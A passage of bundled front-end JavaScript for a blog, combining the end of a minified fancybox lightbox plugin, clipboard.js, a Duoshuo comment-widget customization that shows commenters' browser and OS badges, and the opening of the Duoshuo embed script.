top:c[0],left:c[3]};d.autoCenter&&d.fixed&&!a&&g<=e.h&&f<=e.w?c.position="fixed":d.locked||(c.top+=e.y,c.left+=e.x);c.top=x(Math.max(c.top,c.top+(e.h-g)*d.topRatio));c.left=x(Math.max(c.left,c.left+(e.w-f)*d.leftRatio));return c},_afterZoomIn:function(){var a=b.current;a&&((b.isOpen=b.isOpened=!0,b.wrap.css("overflow","visible").addClass("fancybox-opened"),b.update(),(a.closeClick||a.nextClick&&1<b.group.length)&&b.inner.css("cursor","pointer").bind("click.fb",function(d){f(d.target).is("a")||f(d.target).parent().is("a")||
(d.preventDefault(),b[a.closeClick?"close":"next"]())}),a.closeBtn&&f(a.tpl.closeBtn).appendTo(b.skin).bind("click.fb",function(a){a.preventDefault();b.close()}),a.arrows&&1<b.group.length&&((a.loop||0<a.index)&&f(a.tpl.prev).appendTo(b.outer).bind("click.fb",b.prev),(a.loop||a.index<b.group.length-1)&&f(a.tpl.next).appendTo(b.outer).bind("click.fb",b.next)),b.trigger("afterShow"),a.loop||a.index!==a.group.length-1)?b.opts.autoPlay&&!b.player.isActive&&(b.opts.autoPlay=!1,b.play(!0)):b.play(!1))},
_afterZoomOut:function(a){a=a||b.current;f(".fancybox-wrap").trigger("onReset").remove();f.extend(b,{group:{},opts:{},router:!1,current:null,isActive:!1,isOpened:!1,isOpen:!1,isClosing:!1,wrap:null,skin:null,outer:null,inner:null});b.trigger("afterClose",a)}});b.transitions={getOrigPosition:function(){var a=b.current,d=a.element,e=a.orig,c={},f=50,g=50,h=a.hPadding,k=a.wPadding,n=b.getViewport();!e&&a.isDom&&d.is(":visible")&&(e=d.find("img:first"),e.length||(e=d));u(e)?(c=e.offset(),e.is("img")&&
(f=e.outerWidth(),g=e.outerHeight())):(c.top=n.y+(n.h-g)*a.topRatio,c.left=n.x+(n.w-f)*a.leftRatio);if("fixed"===b.wrap.css("position")||a.locked)c.top-=n.y,c.left-=n.x;return c={top:x(c.top-h*a.topRatio),left:x(c.left-k*a.leftRatio),width:x(f+k),height:x(g+h)}},step:function(a,d){var e,c,f=d.prop;c=b.current;var g=c.wrapSpace,h=c.skinSpace;if("width"===f||"height"===f)e=d.end===d.start?1:(a-d.start)/(d.end-d.start),b.isClosing&&(e=1-e),c="width"===f?c.wPadding:c.hPadding,c=a-c,b.skin[f](m("width"===
f?c:c-g*e)),b.inner[f](m("width"===f?c:c-g*e-h*e))},zoomIn:function(){var a=b.current,d=a.pos,e=a.openEffect,c="elastic"===e,l=f.extend({opacity:1},d);delete l.position;c?(d=this.getOrigPosition(),a.openOpacity&&(d.opacity=0.1)):"fade"===e&&(d.opacity=0.1);b.wrap.css(d).animate(l,{duration:"none"===e?0:a.openSpeed,easing:a.openEasing,step:c?this.step:null,complete:b._afterZoomIn})},zoomOut:function(){var a=b.current,d=a.closeEffect,e="elastic"===d,c={opacity:0.1};e&&(c=this.getOrigPosition(),a.closeOpacity&&
(c.opacity=0.1));b.wrap.animate(c,{duration:"none"===d?0:a.closeSpeed,easing:a.closeEasing,step:e?this.step:null,complete:b._afterZoomOut})},changeIn:function(){var a=b.current,d=a.nextEffect,e=a.pos,c={opacity:1},f=b.direction,g;e.opacity=0.1;"elastic"===d&&(g="down"===f||"up"===f?"top":"left","down"===f||"right"===f?(e[g]=x(m(e[g])-200),c[g]="+=200px"):(e[g]=x(m(e[g])+200),c[g]="-=200px"));"none"===d?b._afterZoomIn():b.wrap.css(e).animate(c,{duration:a.nextSpeed,easing:a.nextEasing,complete:b._afterZoomIn})},
changeOut:function(){var a=b.previous,d=a.prevEffect,e={opacity:0.1},c=b.direction;"elastic"===d&&(e["down"===c||"up"===c?"top":"left"]=("up"===c||"left"===c?"-":"+")+"=200px");a.wrap.animate(e,{duration:"none"===d?0:a.prevSpeed,easing:a.prevEasing,complete:function(){f(this).trigger("onReset").remove()}})}};b.helpers.overlay={defaults:{closeClick:!0,speedOut:200,showEarly:!0,css:{},locked:!t,fixed:!0},overlay:null,fixed:!1,el:f("html"),create:function(a){var d;a=f.extend({},this.defaults,a);this.overlay&&
this.close();d=b.coming?b.coming.parent:a.parent;this.overlay=f('<div class="fancybox-overlay"></div>').appendTo(d&&d.lenth?d:"body");this.fixed=!1;a.fixed&&b.defaults.fixed&&(this.overlay.addClass("fancybox-overlay-fixed"),this.fixed=!0)},open:function(a){var d=this;a=f.extend({},this.defaults,a);this.overlay?this.overlay.unbind(".overlay").width("auto").height("auto"):this.create(a);this.fixed||(q.bind("resize.overlay",f.proxy(this.update,this)),this.update());a.closeClick&&this.overlay.bind("click.overlay",
function(a){if(f(a.target).hasClass("fancybox-overlay"))return b.isActive?b.close():d.close(),!1});this.overlay.css(a.css).show()},close:function(){q.unbind("resize.overlay");this.el.hasClass("fancybox-lock")&&(f(".fancybox-margin").removeClass("fancybox-margin"),this.el.removeClass("fancybox-lock"),q.scrollTop(this.scrollV).scrollLeft(this.scrollH));f(".fancybox-overlay").remove().hide();f.extend(this,{overlay:null,fixed:!1})},update:function(){var a="100%",b;this.overlay.width(a).height("100%");
J?(b=Math.max(H.documentElement.offsetWidth,H.body.offsetWidth),p.width()>b&&(a=p.width())):p.width()>q.width()&&(a=p.width());this.overlay.width(a).height(p.height())},onReady:function(a,b){var e=this.overlay;f(".fancybox-overlay").stop(!0,!0);e||this.create(a);a.locked&&this.fixed&&b.fixed&&(b.locked=this.overlay.append(b.wrap),b.fixed=!1);!0===a.showEarly&&this.beforeShow.apply(this,arguments)},beforeShow:function(a,b){b.locked&&!this.el.hasClass("fancybox-lock")&&(!1!==this.fixPosition&&f("*").filter(function(){return"fixed"===
f(this).css("position")&&!f(this).hasClass("fancybox-overlay")&&!f(this).hasClass("fancybox-wrap")}).addClass("fancybox-margin"),this.el.addClass("fancybox-margin"),this.scrollV=q.scrollTop(),this.scrollH=q.scrollLeft(),this.el.addClass("fancybox-lock"),q.scrollTop(this.scrollV).scrollLeft(this.scrollH));this.open(a)},onUpdate:function(){this.fixed||this.update()},afterClose:function(a){this.overlay&&!b.coming&&this.overlay.fadeOut(a.speedOut,f.proxy(this.close,this))}};b.helpers.title={defaults:{type:"float",
position:"bottom"},beforeShow:function(a){var d=b.current,e=d.title,c=a.type;f.isFunction(e)&&(e=e.call(d.element,d));if(r(e)&&""!==f.trim(e)){d=f('<div class="fancybox-title fancybox-title-'+c+'-wrap">'+e+"</div>");switch(c){case "inside":c=b.skin;break;case "outside":c=b.wrap;break;case "over":c=b.inner;break;default:c=b.skin,d.appendTo("body"),J&&d.width(d.width()),d.wrapInner('<span class="child"></span>'),b.current.margin[2]+=Math.abs(m(d.css("margin-bottom")))}d["top"===a.position?"prependTo":
"appendTo"](c)}}};f.fn.fancybox=function(a){var d,e=f(this),c=this.selector||"",l=function(g){var h=f(this).blur(),k=d,l,m;g.ctrlKey||g.altKey||g.shiftKey||g.metaKey||h.is(".fancybox-wrap")||(l=a.groupAttr||"data-fancybox-group",m=h.attr(l),m||(l="rel",m=h.get(0)[l]),m&&""!==m&&"nofollow"!==m&&(h=c.length?f(c):e,h=h.filter("["+l+'="'+m+'"]'),k=h.index(this)),a.index=k,!1!==b.open(h,a)&&g.preventDefault())};a=a||{};d=a.index||0;c&&!1!==a.live?p.undelegate(c,"click.fb-start").delegate(c+":not('.fancybox-item, .fancybox-nav')",
"click.fb-start",l):e.unbind("click.fb-start").bind("click.fb-start",l);this.filter("[data-fancybox-start=1]").trigger("click");return this};p.ready(function(){var a,d;f.scrollbarWidth===w&&(f.scrollbarWidth=function(){var a=f('<div style="width:50px;height:50px;overflow:auto"><div/></div>').appendTo("body"),b=a.children(),b=b.innerWidth()-b.height(99).innerWidth();a.remove();return b});f.support.fixedPosition===w&&(f.support.fixedPosition=function(){var a=f('<div style="position:fixed;top:20px;"></div>').appendTo("body"),
b=20===a[0].offsetTop||15===a[0].offsetTop;a.remove();return b}());f.extend(b.defaults,{scrollbarWidth:f.scrollbarWidth(),fixed:f.support.fixedPosition,parent:f("body")});a=f(s).width();K.addClass("fancybox-lock-test");d=f(s).width();K.removeClass("fancybox-lock-test");f("<style type='text/css'>.fancybox-margin{margin-right:"+(d-a)+"px;}</style>").appendTo("head")})})(window,document,jQuery);
/*!
 * clipboard.js v1.4.3
 * https://zenorocha.github.io/clipboard.js
 *
 * Licensed MIT © Zeno Rocha
 */
!function(t){if("object"==typeof exports&&"undefined"!=typeof module)module.exports=t();else if("function"==typeof define&&define.amd)define([],t);else{var e;e="undefined"!=typeof window?window:"undefined"!=typeof global?global:"undefined"!=typeof self?self:this,e.Clipboard=t()}}(function(){var t,e,n;return function t(e,n,i){function o(a,c){if(!n[a]){if(!e[a]){var s="function"==typeof require&&require;if(!c&&s)return s(a,!0);if(r)return r(a,!0);var l=new Error("Cannot find module '"+a+"'");throw l.code="MODULE_NOT_FOUND",l}var u=n[a]={exports:{}};e[a][0].call(u.exports,function(t){var n=e[a][1][t];return o(n?n:t)},u,u.exports,t,e,n,i)}return n[a].exports}for(var r="function"==typeof require&&require,a=0;a<i.length;a++)o(i[a]);return o}({1:[function(t,e,n){var i=t("matches-selector");e.exports=function(t,e,n){for(var o=n?t:t.parentNode;o&&o!==document;){if(i(o,e))return o;o=o.parentNode}}},{"matches-selector":2}],2:[function(t,e,n){function i(t,e){if(r)return r.call(t,e);for(var n=t.parentNode.querySelectorAll(e),i=0;i<n.length;++i)if(n[i]==t)return!0;return!1}var o=Element.prototype,r=o.matchesSelector||o.webkitMatchesSelector||o.mozMatchesSelector||o.msMatchesSelector||o.oMatchesSelector;e.exports=i},{}],3:[function(t,e,n){var i=t("closest");n.bind=function(t,e,n,o,r){return t.addEventListener(n,function(n){var r=n.target||n.srcElement;n.delegateTarget=i(r,e,!0,t),n.delegateTarget&&o.call(t,n)},r)},n.unbind=function(t,e,n,i){t.removeEventListener(e,n,i)}},{closest:1}],4:[function(t,e,n){function i(t){var e=window.getSelection();if("INPUT"===t.nodeName||"TEXTAREA"===t.nodeName)t.selectionStart=0,t.selectionEnd=t.value.length;else{var n=document.createRange();n.selectNodeContents(t),e.removeAllRanges(),e.addRange(n)}return e.toString()}e.exports=i},{}],5:[function(t,e,n){function i(){}i.prototype={on:function(t,e,n){var i=this.e||(this.e={});return(i[t]||(i[t]=[])).push({fn:e,ctx:n}),this},once:function(t,e,n){function i(){o.off(t,i),e.apply(n,arguments)}var o=this;return i._=e,this.on(t,i,n)},emit:function(t){var e=[].slice.call(arguments,1),n=((this.e||(this.e={}))[t]||[]).slice(),i=0,o=n.length;for(i;o>i;i++)n[i].fn.apply(n[i].ctx,e);return this},off:function(t,e){var n=this.e||(this.e={}),i=n[t],o=[];if(i&&e)for(var r=0,a=i.length;a>r;r++)i[r].fn!==e&&i[r].fn._!==e&&o.push(i[r]);return o.length?n[t]=o:delete n[t],this}},e.exports=i},{}],6:[function(t,e,n){"use strict";function i(t){return t&&t.__esModule?t:{"default":t}}function o(t,e){if(!(t instanceof e))throw new TypeError("Cannot call a class as a function")}n.__esModule=!0;var r=function(){function t(t,e){for(var n=0;n<e.length;n++){var i=e[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(t,i.key,i)}}return function(e,n,i){return n&&t(e.prototype,n),i&&t(e,i),e}}(),a=t("select"),c=i(a),s=function(){function t(e){o(this,t),this.resolveOptions(e),this.initSelection()}return t.prototype.resolveOptions=function t(){var e=arguments.length<=0||void 0===arguments[0]?{}:arguments[0];this.action=e.action,this.emitter=e.emitter,this.target=e.target,this.text=e.text,this.trigger=e.trigger,this.selectedText=""},t.prototype.initSelection=function t(){if(this.text&&this.target)throw new Error('Multiple attributes declared, use either "target" or "text"');if(this.text)this.selectFake();else{if(!this.target)throw new Error('Missing required attributes, use either "target" or "text"');this.selectTarget()}},t.prototype.selectFake=function t(){var e=this;this.removeFake(),this.fakeHandler=document.body.addEventListener("click",function(){return e.removeFake()}),this.fakeElem=document.createElement("textarea"),this.fakeElem.style.position="absolute",this.fakeElem.style.left="-9999px",this.fakeElem.style.top=(window.pageYOffset||document.documentElement.scrollTop)+"px",this.fakeElem.setAttribute("readonly",""),this.fakeElem.value=this.text,document.body.appendChild(this.fakeElem),this.selectedText=c.default(this.fakeElem),this.copyText()},t.prototype.removeFake=function t(){this.fakeHandler&&(document.body.removeEventListener("click"),this.fakeHandler=null),this.fakeElem&&(document.body.removeChild(this.fakeElem),this.fakeElem=null)},t.prototype.selectTarget=function t(){this.selectedText=c.default(this.target),this.copyText()},t.prototype.copyText=function t(){var e=void 0;try{e=document.execCommand(this.action)}catch(n){e=!1}this.handleResult(e)},t.prototype.handleResult=function t(e){e?this.emitter.emit("success",{action:this.action,text:this.selectedText,trigger:this.trigger,clearSelection:this.clearSelection.bind(this)}):this.emitter.emit("error",{action:this.action,trigger:this.trigger,clearSelection:this.clearSelection.bind(this)})},t.prototype.clearSelection=function t(){this.target&&this.target.blur(),window.getSelection().removeAllRanges()},t.prototype.destroy=function t(){this.removeFake()},r(t,[{key:"action",set:function t(){var e=arguments.length<=0||void 0===arguments[0]?"copy":arguments[0];if(this._action=e,"copy"!==this._action&&"cut"!==this._action)throw new Error('Invalid "action" value, use either "copy" or "cut"')},get:function t(){return this._action}},{key:"target",set:function t(e){if(void 0!==e){if(!e||"object"!=typeof e||1!==e.nodeType)throw new Error('Invalid "target" value, use a valid Element');this._target=e}},get:function t(){return this._target}}]),t}();n.default=s,e.exports=n.default},{select:4}],7:[function(t,e,n){"use strict";function i(t){return t&&t.__esModule?t:{"default":t}}function o(t,e){if(!(t instanceof e))throw new TypeError("Cannot call a class as a function")}function r(t,e){if("function"!=typeof e&&null!==e)throw new TypeError("Super expression must either be null or a function, not "+typeof e);t.prototype=Object.create(e&&e.prototype,{constructor:{value:t,enumerable:!1,writable:!0,configurable:!0}}),e&&(Object.setPrototypeOf?Object.setPrototypeOf(t,e):t.__proto__=e)}function a(t,e){var n="data-clipboard-"+t;if(e.hasAttribute(n))return e.getAttribute(n)}n.__esModule=!0;var c=t("./clipboard-action"),s=i(c),l=t("delegate"),u=i(l),f=t("tiny-emitter"),d=i(f),h=function(t){function e(n,i){o(this,e),t.call(this),this.resolveOptions(i),this.delegateClick(n)}return r(e,t),e.prototype.resolveOptions=function t(){var e=arguments.length<=0||void 0===arguments[0]?{}:arguments[0];this.action="function"==typeof e.action?e.action:this.defaultAction,this.target="function"==typeof e.target?e.target:this.defaultTarget,this.text="function"==typeof e.text?e.text:this.defaultText},e.prototype.delegateClick=function t(e){var n=this;this.binding=u.default.bind(document.body,e,"click",function(t){return n.onClick(t)})},e.prototype.undelegateClick=function t(){u.default.unbind(document.body,"click",this.binding)},e.prototype.onClick=function t(e){this.clipboardAction&&(this.clipboardAction=null),this.clipboardAction=new s.default({action:this.action(e.delegateTarget),target:this.target(e.delegateTarget),text:this.text(e.delegateTarget),trigger:e.delegateTarget,emitter:this})},e.prototype.defaultAction=function t(e){return a("action",e)},e.prototype.defaultTarget=function t(e){var n=a("target",e);return n?document.querySelector(n):void 0},e.prototype.defaultText=function t(e){return a("text",e)},e.prototype.destroy=function t(){this.undelegateClick(),this.clipboardAction&&(this.clipboardAction.destroy(),this.clipboardAction=null)},e}(d.default);n.default=h,e.exports=n.default},{"./clipboard-action":6,delegate:3,"tiny-emitter":5}]},{},[7])(7)});
//HelloDog -  http://wsgzao.github.io/post/duoshuo/
//More info: http://moxfive.xyz/2015/09/29/duosuo-style
//移动客户端判断开始
function checkMobile() {
    var isiPad = navigator.userAgent.match(/iPad/i) != null;
    if (isiPad) {
        return false;
    }
    var isMobile = navigator.userAgent.match(/iphone|android|phone|mobile|wap|netfront|java|opera mobi|opera mini|ucweb|windows ce|symbian|symbianos|series|webos|sony|blackberry|dopod|nokia|samsung|palmsource|xda|pieplus|meizu|midp|cldc|motorola|foma|docomo|up.browser|up.link|blazer|helio|hosin|huawei|novarra|coolpad|webos|techfaith|palmsource|alcatel|amoi|ktouch|nexian|ericsson|philips|sagem|wellcom|bunjalloo|maui|smartphone|iemobile|spice|bird|zte-|longcos|pantech|gionee|portalmmm|jig browser|hiptop|benq|haier|^lct|320x320|240x320|176x220/i) != null;
    if (isMobile) {
        return true;
    }
    return false;
}
//移动客户端判断结束
//管理员判断开始
function sskadmin(e) {
    var ssk = '';
    if (e.user_id == 6225154084773561090) {
        if (checkMobile()) {
            ssk = '<span class="ua"><span class="sskadmin">Captain</span></span><br><br>';
        } else {
            ssk = '<span class="ua"><span class="sskadmin">Captain</span></span>';
        }
    } else {
        if (checkMobile()) {
            ssk = '<br><br>';
        }
    }
    return ssk;
}
//管理员判断结束
//显UA开始
function ua(e) {
    var r = new Array;
    var outputer = '';
    if (r = e.match(/FireFox\/([^\s]+)/ig)) {
        var r1 = r[0].split("/");
        outputer = '<span class="ua_firefox"><i class="fa fa-firefox"></i> FireFox'
    } else if (r = e.match(/Maxthon([\d]*)\/([^\s]+)/ig)) {
        var r1 = r[0].split("/");
        outputer = '<span class="ua_maxthon"><i class="fa fa-globe"></i> Maxthon'
    } else if (r = e.match(/BIDUBrowser([\d]*)\/([^\s]+)/ig)) {
        var r1 = r[0].split("/");
        outputer = '<span class="ua_ucweb"><i class="fa fa-globe"></i> 百度浏览器'
    } else if (r = e.match(/UBrowser([\d]*)\/([^\s]+)/ig)) {
        var r1 = r[0].split("/");
        outputer = '<span class="ua_ucweb"><i class="fa fa-globe"></i> UCBrowser'
    } else if (r = e.match(/UCBrowser([\d]*)\/([^\s]+)/ig)) {
        var r1 = r[0].split("/");
        outputer = '<span class="ua_ucweb"><i class="fa fa-globe"></i> UCBrowser'
    } else if (r = e.match(/MetaSr/ig)) {
        outputer = '<span class="ua_sogou"><i class="fa fa-globe"></i> 搜狗浏览器'
    } else if (r = e.match(/2345Explorer/ig)) {
        outputer = '<span class="ua_2345explorer"><i class="fa fa-globe"></i> 2345王牌浏览器'
    } else if (r = e.match(/2345chrome/ig)) {
        outputer = '<span class="ua_2345chrome"><i class="fa fa-globe"></i> 2345加速浏览器'
    } else if (r = e.match(/LBBROWSER/ig)) {
        outputer = '<span class="ua_lbbrowser"><i class="fa fa-globe"></i> 猎豹安全浏览器'
    } else if (r = e.match(/MicroMessenger\/([^\s]+)/ig)) {
        var r1 = r[0].split("/");
        outputer = '<span class="ua_qq"><i class="fa fa-weixin"></i> 微信'
        /*.split('/')[0]*/
    } else if (r = e.match(/QQBrowser\/([^\s]+)/ig)) {
        var r1 = r[0].split("/");
        outputer = '<span class="ua_qq"><i class="fa fa-qq"></i> QQ浏览器'
        /*.split('/')[0]*/
    } else if (r = e.match(/QQ\/([^\s]+)/ig)) {
        var r1 = r[0].split("/");
        outputer = '<span class="ua_qq"><i class="fa fa-qq"></i> QQ浏览器'
        /*.split('/')[0]*/
    } else if (r = e.match(/MiuiBrowser\/([^\s]+)/ig)) {
        var r1 = r[0].split("/");
        outputer = '<span class="ua_mi"><i class="fa fa-globe"></i> Miui浏览器'
        /*.split('/')[0]*/
    } else if (r = e.match(/Chrome([\d]*)\/([^\s]+)/ig)) {
        var r1 = r[0].split("/");
        outputer = '<span class="ua_chrome"><i class="fa fa-chrome"></i> Chrome'
        /*.split('.')[0]*/
    } else if (r = e.match(/safari\/([^\s]+)/ig)) {
        var r1 = r[0].split("/");
        outputer = '<span class="ua_apple"><i class="fa fa-safari"></i> Safari'
    } else if (r = e.match(/Opera[\s|\/]([^\s]+)/ig)) {
        var r1 = r[0].split("/");
        outputer = '<span class="ua_opera"><i class="fa fa-opera"></i> Opera'
    } else if (r = e.match(/Trident\/7.0/gi)) {
        outputer = '<span class="ua_ie"><i class="fa fa-internet-explorer"></i> IE 11'
    } else if (r = e.match(/MSIE\s([^\s|;]+)/gi)) {
        outputer = '<span class="ua_ie"><i class="fa fa-internet-explorer"></i> IE' + ' ' + r[0]
        /*.replace('MSIE', '').split('.')[0]*/
    } else {
        outputer = '<span class="ua_other"><i class="fa fa-globe"></i> 其它浏览器'
    }
    if (checkMobile()) {
        Mobile = '<br><br>';
    } else {
        Mobile = '';
    }
    return outputer + "</span>" + Mobile;
}
function os(e) {
    var os = '';
    if (e.match(/win/ig)) {
        if (e.match(/nt 5.1/ig)) {
            os = '<span class="os_xp"><i class="fa fa-windows"></i> Windows XP'
        } else if (e.match(/nt 6.1/ig)) {
            os = '<span class="os_7"><i class="fa fa-windows"></i> Windows 7'
        } else if (e.match(/nt 6.2/ig)) {
            os = '<span class="os_8"><i class="fa fa-windows"></i> Windows 8'
        } else if (e.match(/nt 6.3/ig)) {
            os = '<span class="os_8_1"><i class="fa fa-windows"></i> Windows 8.1'
        } else if (e.match(/nt 10.0/ig)) {
            os = '<span class="os_8_1"><i class="fa fa-windows"></i> Windows 10'
        } else if (e.match(/nt 6.0/ig)) {
            os = '<span class="os_vista"><i class="fa fa-windows"></i> Windows Vista'
        } else if (e.match(/nt 5/ig)) {
            os = '<span class="os_2000"><i class="fa fa-windows"></i> Windows 2000'
        } else {
            os = '<span class="os_windows"><i class="fa fa-windows"></i> Windows'
        }
    } else if (e.match(/android/ig)) {
        os = '<span class="os_android"><i class="fa fa-android"></i> Android'
    } else if (e.match(/ubuntu/ig)) {
        os = '<span class="os_ubuntu"><i class="fa fa-desktop"></i> Ubuntu'
    } else if (e.match(/linux/ig)) {
        os = '<span class="os_linux"><i class="fa fa-linux"></i> Linux'
    } else if (e.match(/mac/ig)) {
        os = '<span class="os_mac"><i class="fa fa-apple"></i> Mac OS X'
    } else if (e.match(/unix/ig)) {
        os = '<span class="os_unix"><i class="fa fa-desktop"></i> Unix'
    } else if (e.match(/symbian/ig)) {
        os = '<span class="os_nokia"><i class="fa fa-mobile"></i> Nokia SymbianOS'
    } else {
        os = '<span class="os_other"><i class="fa fa-desktop"></i> 其它操作系统'
    }
    return os + "</span>";
}
//显UA结束

(function(e, t, n) {
    function at(e, t) {
        for (var n in t) t[n] && (e[n] ? e[n].set(t[n]) : e[n] = new et(t[n]))
    }
    function ft(e, t) {
        for (var n in t) e[n] = t[n]
    }
    function lt() {
        if (u.checkPermission()) return;
        var t;
        while (t = O.shift()) {
            var n = u.createNotification(t.iconUrl, t.title, t.body),
            i = t.url;
            try {
                n.onclick = function() {
                    e.focus(),
                    r.href = i,
                    n.cancel()
                }
            } catch(s) {}
            n.show(),
            setTimeout(function() {
                n.cancel && n.cancel()
            },
            8e3)
        }
    }
    function ct() {
        return rt.data.user_id == 0
    }
    function ht(e, t, n) {
        if (o) try {
            o.removeItem(e),
            o.removeItem(e + ":timestamp"),
            o[e] = i.stringify(t),
            o[e + ":timestamp"] = Math.floor(n)
        } catch(r) {}
    }
    function pt(e) {
        w.theme = e,
        e != "none" && w.injectStylesheet(b + "/styles/embed" + (e ? "." + e + ".css?" + y[e] : "." + short_name) + ".css")
    }
    if (e.DUOSHUO) return;
    var r = e.location,
    i = e.JSON,
    s = e.XMLHttpRequest,
    o = i && i.stringify && e.localStorage,
    u = e.webkitNotifications,
    a = t.getElementsByTagName("head")[0] || t.getElementsByTagName("body")[0],
    f = e.navigator.userAgent,
    l = t.location.protocol == "https:" ? "https:": "http:",
    c = 0,
    h,
    p = function() {
        var e = {
            "<": "&lt;",
            ">": "&gt;",
            '"': "&quot;",
            "'": "&#x27;",
            "`": "&#x60;"
        },
        t = /&(?!\w+;)|[<>"'`]/g,
        n = /[&<>"'`]/,
        r = function(t) {
            return e[t] || "&amp;"
        };
        return function(e) {
            return e == null || e === !1 ? "": n.test(e) ? e.replace(t, r) : e
        }
    } (),
    d = function(e) {
        if (e.match(/^(http|https):/)) return e;
        var n = t.createElement("a");
        return n.href = e,
        x.hrefNormalized ? n.href: n.getAttribute("href", 4)
    },
    v = {
        start: 0,
        end: 0
    },
    m = function(e) {
        var n = this,
        r = 0,
        i = 0,
        s, o, u, a, f;
        t.selection && (o = t.selection.createRange(), o && o.parentElement() == n && (a = n.value.length, s = n.value.replace(/\r\n/g, "\n"), u = n.createTextRange(), u.moveToBookmark(o.getBookmark()), f = n.createTextRange(), f.collapse(!1), u.compareEndPoints("StartToEnd", f) > -1 ? r = i = a: (r = -u.moveStart("character", -a), r += s.slice(0, r).split("\n").length - 1, u.compareEndPoints("EndToEnd", f) > -1 ? i = a: (i = -u.moveEnd("character", -a), i += s.slice(0, i).split("\n").length - 1)))),
        v.start = r,
        v.end = i
    },
    g = function(e) {
        return function() {
            return e
        }
    },
    y = {
        "default": "d6149e1c",
        dark: "c11b5925",
        bluebox: "dbc0a9af"
    },
    b = l + "//static.duoshuo.com",
    w = e.DUOSHUO = {
        DOMAIN: "duoshuo.com",
        REMOTE: "http://duoshuo.com",
        version: 140327,
        loaded: {
            jQuery: typeof jQuery != "undefined" && jQuery.fn.jquery >= "1.5",
            smilies: !1,
            mzadxN: typeof mzadxN != "undefined"
        },
        libs: {
            jQuery: b + "/libs/embed.compat.js?24f8ca3f.js",
            smilies: b + "/libs/smilies.js?921e8eda.js",
            mzadxN: "http://js.miaozhen.com/mz_ad_serving.js"
        },
        sourceName: {
            weibo: "\u65b0\u6d6a\u5fae\u535a",
            qq: "QQ",
            qzone: "QQ\u7a7a\u95f4",
            qqt: "\u817e\u8baf\u5fae\u535a",
            renren: "\u4eba\u4eba\u7f51",
            douban: "\u8c46\u74e3\u7f51",
            netease: "\u7f51\u6613\u5fae\u535a",
            kaixin: "\u5f00\u5fc3\u7f51",
            sohu: "\u641c\u72d0\u5fae\u535a",
            baidu: "\u767e\u5ea6",
            taobao: "\u6dd8\u5b9d",
            msn: "MSN",
            google: "\u8c37\u6b4c"
        },
        serviceNames: {
            weibo: "\u5fae\u535a",
            qq: "QQ",
            douban: "\u8c46\u74e3",
            renren: "\u4eba\u4eba",
            netease: "\u7f51\u6613",
            kaixin: "\u5f00\u5fc3",
            sohu: "\u641c\u72d0",
            baidu: "\u767e\u5ea6",
            taobao: "\u6dd8\u5b9d",
            msn: "MSN",
            google: "\u8c37\u6b4c"
        },
        parseDate: function(e) {
            return e.parse("2011-10-28T00:00:00+08:00") &&
            function(t) {
                return new e(t)
            } || e.parse("2011/10/28T00:00:00+0800") &&
            function(t) {
                return new e(t.replace(/-/g, "/").replace(/:(\d\d)$/, "$1"))
            } || e.parse("2011/10/28 00:00:00+0800") &&
            function(t) {
                return new e(t.replace(/-/g, "/").replace(/:(\d\d)$/, "$1").replace("T", " "))
            } ||
            function(t) {
                return new e(t)
            }
        } (Date),
        fullTime: function(e) {
            var t = w.parseDate(e);
            return t.getFullYear() + "\u5e74" + (t.getMonth() + 1) + "\u6708" + t.getDate() + "\u65e5 " + t.toLocaleTimeString()
        },
        elapsedTime: function(e) {
            var t = w.parseDate(e),
            n = new Date,
            r = (n - c - t) / 1e3;
            return r < 10 ? "\u521a\u521a": r < 60 ? Math.round(r) + "\u79d2\u524d": r < 3600 ? Math.round(r / 60) + "\u5206\u949f\u524d": r < 86400 ? Math.round(r / 3600) + "\u5c0f\u65f6\u524d": (n.getFullYear() == t.getFullYear() ? "": t.getFullYear() + "\u5e74") + (t.getMonth() + 1) + "\u6708" + t.getDate() + "\u65e5"
        },
        require: function(e, t) {
            if (typeof e == "string") w.loaded[e] ? t() : F(w.libs[e],
            function() {
                w.loaded[e] = !0,
                t()
            });
            else if (typeof e == "object") {
                var n, r = !0;
                for (n = 0; n < e.length; n++)(function(i) {
                    if (w.loaded[e[n]]) return;
                    r = !1,
                    F(w.libs[i],
                    function() {
                        w.loaded[i] = !0;
                        for (var n = 0; n < e.length; n++) if (!w.loaded[e[n]]) return;
                        t()
                    })
                })(e[n]);
                r && t()
            }
        },
        getCookie: function(e) {
            var r = " " + e + "=",
            i = t.cookie.split(";"),
            s = 0,
            o,
            u,
            a;
            for (; s < i.length; s++) {
                o = " " + i[s],
                u = o.indexOf(r);
                if (u >= 0 && u + r.length == (a = o.indexOf("=") + 1)) return decodeURIComponent(o.substring(a, o.length).replace(/\+/g, ""))
            }
            return n
        },
        param: function(e) {
            var t = [];
            for (var r in e) e[r] != n && t.push(r + "=" + encodeURIComponent(e[r]));
            return t.join("&")
        },
        ajax: function(e, t, r, o, u) {
            var a = w.getCookie("duoshuo_token");
            r.v = w.version,
            a ? r.jwt = a: z.remote_auth && (r.remote_auth = z.remote_auth);
            if (s && i && i.parse) {
                var f = new s;
                if ( !! f && "withCredentials" in f) {
                    var l;
                    function c(e, t, n, r) {
                        var s, a, f, l = t;
                        if (e >= 200 && e < 300 || e === 304) if (e === 304) l = "notmodified",
                        s = !0;
                        else try {
                            a = i.parse(n),
                            l = "success",
                            s = !0
                        } catch(c) {
                            l = "parsererror",
                            f = c
                        } else {
                            f = l;
                            if (!l || e) l = "error",
                            e < 0 && (e = 0);
                            try {
                                a = i.parse(n)
                            } catch(c) {
                                l = "parsererror",
                                f = c
                            }
                        }
                        s ? o(a) : l === "parseerror" ? I("\u89e3\u6790\u9519\u8bef: " + n) : (u && u(a), I("\u51fa\u9519\u5566(" + a.code + "): " + a.errorMessage), a.errorTrace && I(a.errorTrace))
                    }
                    f.open(e, w.hostUrl + t + ".json" + (e == "GET" ? "?" + w.param(r) : ""), !0),
                    f.withCredentials = !0,
                    f.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8"),
                    f.send(e == "GET" ? null: w.param(r)),
                    l = function(e, t) {
                        var r, i, s, o;
                        try {
                            if (l && (t || f.readyState === 4)) {
                                l = n;
                                if (t) f.readyState !== 4 && f.abort();
                                else {
                                    r = f.status,
                                    s = f.getAllResponseHeaders();
                                    try {
                                        o = f.responseText
                                    } catch(e) {}
                                    try {
                                        i = f.statusText
                                    } catch(u) {
                                        i = ""
                                    }
                                }
                            }
                        } catch(a) {
                            t || c( - 1, a)
                        }
                        o && c(r, i, o, s)
                    },
